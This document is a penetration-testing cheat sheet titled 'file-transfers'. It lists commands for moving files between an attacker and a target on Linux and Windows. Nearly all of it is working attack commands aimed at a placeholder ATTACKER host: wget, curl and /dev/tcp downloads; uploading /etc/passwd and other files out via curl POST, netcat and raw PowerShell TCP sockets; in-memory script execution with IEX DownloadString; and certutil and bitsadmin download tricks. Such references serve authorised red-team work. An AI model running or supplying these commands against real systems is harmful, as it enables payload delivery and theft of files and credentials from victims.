title: file-transfers
html:
file-transfers

> Methods for moving files between attacker and target. Choose based on target OS and available tools.

Linux Target

Download to target

wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file
# If no wget/curl:
bash -c 'cat < /dev/tcp/ATTACKER/80 > /tmp/file'

Upload from target

curl -X POST http://ATTACKER/upload -F "file=@/etc/passwd"
nc ATTACKER 4444 < /tmp/file

Serve files (attacker)

python3 -m http.server 8080
# SMB server (for Windows targets)
smbserver.py share /tmp -smb2support

Windows Target

Download to target

# PowerShell
Invoke-WebRequest http://ATTACKER/file -OutFile C:\Users\Public\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\Users\Public\file')
# In-memory execution (no file on disk)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')

# certutil (LOLBin, works when PowerShell is restricted)
certutil -urlcache -split -f http://ATTACKER/file C:\Users\Public\file

# bitsadmin
bitsadmin /transfer n http://ATTACKER/file C:\Users\Public\file

Upload from target

# PowerShell to HTTP
Invoke-WebRequest -Uri http://ATTACKER/upload -Method POST -Body ([IO.File]::ReadAllBytes("C:\file"))
# TCP socket (works when HTTP is blocked)
$b=[IO.File]::ReadAllBytes("C:\file");$c=New-Object System.Net.Sockets.TcpClient("ATTACKER",4444);$s=$c.GetStream();$s.Write($b,0,$b.Length);$c.Close()

Via SMB

# Attacker: serve SMB share
smbserver.py share /tmp -smb2support
# Target: copy from share
copy \\ATTACKER\share\file.exe C:\Users\Public\

Via SCP

scp user@target:/tmp/file ./file          # download
scp ./file user@target:/tmp/file          # upload
